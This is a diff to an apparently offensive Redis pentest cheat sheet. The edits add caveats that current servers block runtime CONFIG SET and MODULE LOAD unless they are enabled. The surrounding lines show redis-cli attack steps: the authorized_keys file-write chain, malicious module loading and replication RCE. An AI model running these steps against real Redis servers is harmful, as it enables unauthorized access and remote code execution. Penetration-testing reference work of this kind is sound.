@@ -22,7 +22,7 @@ redis-cli -h <target> -a <pass>    # where requirepass is set (crack weak ones)
 
 ## File-write to code execution
 
-Point the RDB file at a sensitive location and write a payload as a key value:
+Point the RDB file at a sensitive location and write a payload as a key value. On current Redis the runtime `CONFIG SET` of `dir`/`dbfilename` is blocked unless the server was started with `enable-protected-configs yes`, so this is primarily an older-server or misconfigured-server technique:
 
 ```bash
 # SSH: write an authorized_keys file into a user's .ssh
@@ -38,7 +38,8 @@ redis-cli -h <target> save
 ## Module load and replication RCE
 
 ```bash
-# Load a malicious module for direct command execution (Redis 4.0+)
+# Load a malicious module for direct command execution (Redis 4.0+;
+# current servers require enable-module-command yes at startup for MODULE LOAD)
 redis-cli -h <target> module load /path/to/exp.so
 
 # Replication RCE: make the target a replica of an attacker "master" that ships a module
@@ -49,7 +50,7 @@ redis-cli -h <target> module load /path/to/exp.so
 
 - Unauthenticated Redis exposed to the network is the headline: no credential needed before the file-write chain.
 - The **authorized_keys** and **cron** drops depend on the Redis service account's privileges (root Redis is the jackpot) and on the directory being writable.
-- **Module load** and **replication** RCE are the cleanest modern paths, giving direct command execution without relying on a writable `.ssh` or cron, where the version supports modules.
+- **Module load** and **replication** RCE are the cleanest paths where module loading is permitted (`enable-module-command yes`), giving direct command execution without relying on a writable `.ssh` or cron.
 - `protected-mode` (default on since 3.2 when no bind/password is set) blocks many of these from remote, so confirm it is off or bypassed.
 
 ## Tools
